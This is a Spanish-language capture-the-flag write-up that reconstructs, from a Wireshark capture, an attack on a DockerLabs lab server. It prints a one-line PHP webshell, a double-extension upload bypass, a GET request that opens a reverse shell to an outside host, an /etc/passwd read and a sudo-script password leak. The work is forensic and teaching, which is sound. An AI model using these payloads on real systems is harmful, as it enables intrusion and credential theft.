# Write-up: Analyst (DockerLabs)

**Categoría:** Análisis de tráfico de red
**Objetivo:** Analizar una captura de tráfico con Wireshark y obtener credenciales
**Dificultad:** Fácil/Media

---

## 1. Reconocimiento inicial

Empecé con un escaneo de puertos con `nmap` sobre la IP de la máquina, que reveló el **puerto 80 (HTTP)** abierto.

Hice una petición con `curl` al servicio web para ver el código fuente de la página:

```bash
curl http://<IP>
```

Revisando el HTML devuelto, encontré **dos rutas de descarga** de archivos. Las abrí directamente en el navegador y descargué dos archivos:

- Un archivo **`.json`**
- Un archivo **`.pcap`** (`incidente_pinguino.pcap`)

El `.pcap` es el que contiene el grueso del reto: una captura de tráfico de red que hay que analizar con Wireshark para reconstruir un incidente de seguridad completo.

---

## 2. Primer vistazo con Wireshark

Abrí `incidente_pinguino.pcap` en Wireshark y, antes de ponerme a mirar paquete por paquete, hice un reconocimiento general:

- **Estadísticas > Jerarquía de protocolo**: para ver qué tipos de tráfico había en la captura (ARP, HTTP, DNS...)
- **Estadísticas > Conversaciones**: para ver qué IPs se comunicaron entre sí

Con esto confirmé que el tráfico relevante era principalmente **HTTP**, entre dos IPs:
- `198.51.100.23` → el atacante / bot externo
- `10.10.2.15` → el servidor web interno (`shop.intranet.local`)

---

## 3. Buscando el punto de entrada

Como no había FTP ni Telnet en la captura, apliqué el filtro:

```
http.request.method == "POST"
```

Esto me mostró **dos peticiones POST** a la misma ruta: `/reviews/upload.php`. Ambas eran de tipo `multipart/form-data`, es decir, subidas de archivos — no un login normal.

### 3.1. Primer intento de subida (bloqueado)

Seguí el stream HTTP del primer POST (`Follow > HTTP Stream`) y vi que el User-Agent se identificaba como `ReconBot/1.0`, lo cual ya es una pista de que esto es un bot automatizado, no un usuario legítimo.

El archivo subido se llamaba `shell.php` y contenía una **webshell**:

```php
<?php if(isset($_GET['cmd'])){ $s=fsockopen($_GET['ip'],$_GET['port']); } ?>
```

El servidor respondió con **403 Forbidden**: *"Tipo de archivo no permitido (extensión .php bloqueada)"*. El filtro de subidas del servidor bloqueaba archivos `.php` por extensión, así que este intento falló.

### 3.2. Segundo intento de subida (con éxito)

Seguí el stream del segundo POST y vi que esta vez el archivo subido se llamaba **`image.jpg.php`** — con **doble extensión**. Esto es una técnica clásica de bypass: si el filtro del servidor solo comprueba si el nombre *contiene* `.jpg` o mira la extensión de forma ingenua, un nombre como `image.jpg.php` puede colar, porque el sistema operativo y PHP ejecutan el archivo según su **última** extensión (`.php`), no la que el filtro cree que está validando.

El servidor respondió con **200 OK**: *"Archivo subido correctamente: /reviews/uploads/image.jpg.php"*.

**Lección clave:** nunca hay que confiar solo en el nombre o extensión del archivo para validar subidas; hay que comprobar también el contenido real (magic bytes) y, preferiblemente, no permitir ejecución de código en el directorio de subidas.

---

## 4. Explotación: de webshell a reverse shell

Con la webshell ya alojada en `/reviews/uploads/image.jpg.php`, el siguiente paso lógico era buscar una petición **GET** a esa ruta, que es como se invoca una webshell de este tipo (vía parámetros en la URL).

Apliqué el filtro:

```
http.request.uri contains "image.jpg.php"
```

Y encontré una petición GET con estos parámetros:

```
GET /reviews/uploads/image.jpg.php?ip=198.51.100.23&port=8080
```

Recordando el código PHP de la webshell (`fsockopen($_GET['ip'], $_GET['port'])`), esto no ejecuta un comando directamente — abre una **conexión saliente** (reverse shell) desde el servidor hacia `198.51.100.23:8080`. Por eso la respuesta HTTP venía vacía (`Content-Length: 0`): la "acción" no pasa por la respuesta HTTP, sino por una conexión TCP aparte.

---

## 5. Analizando la reverse shell

Busqué esa conversación aparte con el filtro:

```
tcp.port == 8080
```

Apareció una conversación TCP completa y extensa entre el servidor (`10.10.2.15`) y el atacante (`198.51.100.23`), con muchos paquetes `PSH` (datos siendo enviados en ambas direcciones) — el patrón típico de una sesión de shell interactiva en texto plano.

Con `Follow > TCP Stream` reconstruí la sesión completa, línea a línea, como si estuviera leyendo por encima del hombro al atacante:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ uname -a
Linux webserver01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
pinguinito:x:1001:1001:Pinguinito,,,:/home/pinguinito:/bin/bash
```

Ya con acceso como `www-data`, el atacante comprobó privilegios de sudo:

```bash
$ sudo -l
Matching Defaults entries for www-data on webserver01:
User www-data may run the following commands on webserver01:
    (ALL) NOPASSWD: /opt/scripts/reset_user_pass.sh
```

**Aquí está la escalada clave del reto**: `www-data` puede ejecutar ese script como root, sin contraseña. Y el script sirve para resetear la contraseña de un usuario:

```bash
$ sudo /opt/scripts/reset_user_pass.sh pinguinito
[reset_user_pass] Generando nueva contraseña para el usuario 'pinguinito'...
[reset_user_pass] Ejecutando: passwd pinguinito
[reset_user_pass] Nueva contraseña establecida: Tr0pic4l-Pingu_99!
[reset_user_pass] Proceso completado.
```

**El script imprime la nueva contraseña por pantalla.** Este es un fallo de diseño muy habitual en scripts de administración "caseros": generan una contraseña fuerte, sí, pero la exponen en el output/logs, lo cual anula por completo el propósito de generar una contraseña aleatoria.

---

## 6. Credenciales obtenidas

- **Usuario:** `pinguinito`
- **Contraseña:** `Tr0pic4l-Pingu_99!`

Verifiqué el acceso por SSH:

```bash
ssh pinguinito@<IP>
```

(Tuve que limpiar una entrada antigua de `known_hosts` con `ssh-keygen -R <IP>` porque la IP se reutiliza entre máquinas de DockerLabs y la huella de la clave había cambiado — nada relacionado con el reto en sí, solo gestión de mi propio Kali).

Acceso confirmado. **Objetivo del laboratorio cumplido.**

---

## 7. Resumen de la cadena de ataque

| Paso | Técnica |
|---|---|
| 1. Reconocimiento | Descubrimiento de rutas de descarga en el HTML del servicio web |
| 2. Bypass de filtro | Subida de webshell con doble extensión (`image.jpg.php`) tras un primer intento bloqueado |
| 3. Ejecución remota | Webshell con `fsockopen` → reverse shell hacia el atacante en el puerto 8080 |
| 4. Post-explotación | `sudo -l` revela un script ejecutable sin contraseña |
| 5. Obtención de credenciales | El script de reset de contraseña expone la nueva contraseña en su output |
| 6. Verificación | Acceso SSH confirmado con las credenciales obtenidas |

---

## 8. Aprendizajes para recordar

- **Nunca validar subidas de archivos solo por extensión aparente** — hay que comprobar el tipo real de contenido y evitar que el directorio de subidas permita ejecución de scripts.
- **`sudo -l` es de los primeros comandos a ejecutar** tras conseguir cualquier acceso a un sistema (ya sea en una auditoría real o en un CTF) — revela rápidamente rutas de escalada de privilegios mal configuradas.
- **Los scripts de administración no deben imprimir secretos en su salida estándar.** Si un script genera una contraseña, debe almacenarla de forma segura (gestor de secretos, archivo con permisos restringidos) y nunca mostrarla por pantalla o dejarla en logs.
- **Wireshark + `Follow TCP/HTTP Stream` es la herramienta más rápida** para reconstruir una sesión completa sin tener que leer paquete a paquete — fundamental en análisis forense de red.
